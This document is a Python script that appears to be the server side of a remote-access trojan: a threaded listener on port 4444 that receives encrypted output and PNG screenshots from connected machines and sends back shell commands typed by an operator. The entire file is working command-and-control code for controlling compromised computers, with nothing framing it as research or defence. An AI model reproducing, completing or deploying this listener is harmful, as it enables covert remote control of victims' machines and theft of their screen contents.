import socket
from cryptography.fernet import Fernet
import threading

# Key management
KEY_FILE = "secret.key"

try:
    with open(KEY_FILE, "rb") as f:
        key = f.read()
except FileNotFoundError:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

fernet = Fernet(key)
print(f"AES Key: {key.decode()}")

def handle_client(client_socket, addr):
    try:
        while True:
            # Receive and decrypt data
            data = client_socket.recv(4096)
            if not data:
                break
            decrypted = fernet.decrypt(data)
            if decrypted.startswith(b"iVBORw0KGgo"):  # PNG magic bytes for screenshots
                with open(f"screenshot_{addr[0]}.png", "wb") as f:
                    f.write(decrypted)  # Save raw PNG
                print(f"Screenshot saved as screenshot_{addr[0]}.png")
            else:
                print(f"Output from {addr}: {decrypted.decode()}")
            
            # Send command
            cmd = input(f"Shell [{addr[0]}]> ")
            if cmd.lower() == "exit":
                client_socket.send(fernet.encrypt(b"exit"))
                break
            client_socket.send(fernet.encrypt(cmd.encode()))
    except Exception as e:
        print(f"Error with {addr}: {e}")
    finally:
        client_socket.close()

def start_listener(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Listening on {host}:{port}")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

if __name__ == "__main__":
    start_listener()
